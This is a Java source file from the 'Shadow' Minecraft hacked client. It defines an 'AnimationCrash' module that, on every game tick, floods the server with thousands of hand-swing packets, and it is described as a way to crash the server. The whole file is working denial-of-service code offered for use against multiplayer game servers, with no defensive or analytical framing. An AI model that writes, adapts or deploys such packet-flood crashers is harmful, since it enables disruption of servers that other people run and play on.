/*
 * Copyright (c) Shadow client, 0x150, Saturn5VFive 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import java.util.Objects;

import net.minecraft.client.util.math.MatrixStack;
import net.shadow.client.ShadowMain;
import net.shadow.client.feature.config.DoubleSetting;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.world.World;

public class AnimationCrash extends Module {
    
    static World w;
    final DoubleSetting power = this.config.create(new DoubleSetting.Builder(3000).min(2000).max(10000).name("Power").description("the amount of packets to send to the server").get());

    public AnimationCrash() {
        super("Animation", "crash the server with animation packets", ModuleType.CRASH);
    }

    @Override
    public void tick() {
        if (w != ShadowMain.client.player.clientWorld) {
            this.setEnabled(false);
            return;
        }
        try{
            for (int i = 0; i < power.getValue(); i++) {
                Objects.requireNonNull(ShadowMain.client.player.networkHandler).sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
            }
        }catch(NullPointerException e){

        }
    }

    @Override
    public void enable() {
        w = ShadowMain.client.player.clientWorld;
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}
